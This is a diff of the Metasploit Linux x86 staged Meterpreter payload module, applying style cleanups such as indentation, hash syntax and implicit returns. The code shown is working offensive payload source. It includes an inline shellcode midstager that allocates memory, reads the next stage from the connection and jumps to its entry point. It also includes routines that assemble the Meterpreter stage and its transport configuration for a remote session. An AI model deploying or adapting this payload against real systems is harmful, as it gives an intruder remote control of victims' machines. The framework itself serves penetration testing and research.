@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -13,56 +14,54 @@ module MetasploitModule
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Linux Meterpreter',
-      'Description'   => 'Inject the meterpreter server payload (staged)',
-      'Author'        => ['PKS', 'egypt', 'OJ Reeves'],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X86,
-      'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
+                      'Name'          => 'Linux Meterpreter',
+                      'Description'   => 'Inject the meterpreter server payload (staged)',
+                      'Author'        => ['PKS', 'egypt', 'OJ Reeves'],
+                      'Platform'      => 'linux',
+                      'Arch'          => ARCH_X86,
+                      'License'       => MSF_LICENSE,
+                      'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
 
     register_options([
-      OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
-    ], self.class)
+                       OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
+                     ], self.class)
   end
 
   def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
     ep = elf.elf_header.e_entry
-    return ep
+    ep
   end
 
-=begin
-  def elf2bin(payload)
-    # XXX, not working. Use .c version
-
-    # This code acts as a mini elf parser / memory layout linker.
-    # It will return what a elf file looks like once loaded in memory
-
-    mem = "\x00" * (4 * 1024 * 1024)
-    used = 0
-
-    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
-
-    elf.program_header.each { |hdr|
-      if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
-        print_status("Found PT_LOAD")
-        fileidx = hdr.p_offset & (~4095)
-        memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
-        len = hdr.p_filesz + (hdr.p_vaddr & 4095)
-
-        mem[memidx,memidx+len] = payload[fileidx,fileidx+len] # should result in a single memcpy call :D
-        used += (hdr.p_memsz + (hdr.p_vaddr & 4095) + 4095) & ~4095
-      end
-    }
-
-    # Maybe at some stage zero out elf header / program headers in case tools
-    # try to look for them
-
-    print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
-    return mem[0, used]
-  end
-=end
+  #   def elf2bin(payload)
+  #     # XXX, not working. Use .c version
+  #
+  #     # This code acts as a mini elf parser / memory layout linker.
+  #     # It will return what a elf file looks like once loaded in memory
+  #
+  #     mem = "\x00" * (4 * 1024 * 1024)
+  #     used = 0
+  #
+  #     elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+  #
+  #     elf.program_header.each { |hdr|
+  #       if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
+  #         print_status("Found PT_LOAD")
+  #         fileidx = hdr.p_offset & (~4095)
+  #         memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
+  #         len = hdr.p_filesz + (hdr.p_vaddr & 4095)
+  #
+  #         mem[memidx,memidx+len] = payload[fileidx,fileidx+len] # should result in a single memcpy call :D
+  #         used += (hdr.p_memsz + (hdr.p_vaddr & 4095) + 4095) & ~4095
+  #       end
+  #     }
+  #
+  #     # Maybe at some stage zero out elf header / program headers in case tools
+  #     # try to look for them
+  #
+  #     print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
+  #     return mem[0, used]
+  #   end
 
   def handle_intermediate_stage(conn, payload)
     entry_offset = elf_ep(payload)
@@ -76,7 +75,7 @@ module MetasploitModule
 
     # Does a mmap() / read() loop of a user specified length, then
     # jumps to the entry point (the \x5a's)
-    midstager_asm = %Q^
+    midstager_asm = %(
       midstager:
         and esp, 0xFFFFF254
         push 0x4
@@ -128,7 +127,7 @@ module MetasploitModule
         mov eax, #{encoded_entry}               ; put the entry point in eax
         call eax
         jmp terminate
-    ^
+    )
 
     midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
 
@@ -138,11 +137,10 @@ module MetasploitModule
 
     # Send length of payload
     conn.put([ payload.length ].pack('V'))
-    return true
-
+    true
   end
 
-  def generate_stage(opts={})
+  def generate_stage(opts = {})
     meterpreter = generate_meterpreter
     config = generate_config(opts)
     meterpreter + config
@@ -152,18 +150,18 @@ module MetasploitModule
     MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
   end
 
-  def generate_config(opts={})
+  def generate_config(opts = {})
     opts[:uuid] ||= generate_payload_uuid
 
     # create the configuration block, which for staged connections is really simple.
     config_opts = {
-      :arch       => opts[:uuid].arch,
-      :exitfunk   => nil,
-      :expiration => datastore['SessionExpirationTimeout'].to_i,
-      :uuid       => opts[:uuid],
-      :transports => [transport_config(opts)],
-      :extensions => [],
-      :ascii_str  => true
+      arch: opts[:uuid].arch,
+      exitfunk: nil,
+      expiration: datastore['SessionExpirationTimeout'].to_i,
+      uuid: opts[:uuid],
+      transports: [transport_config(opts)],
+      extensions: [],
+      ascii_str: true
     }
 
     # create the configuration instance based off the parameters
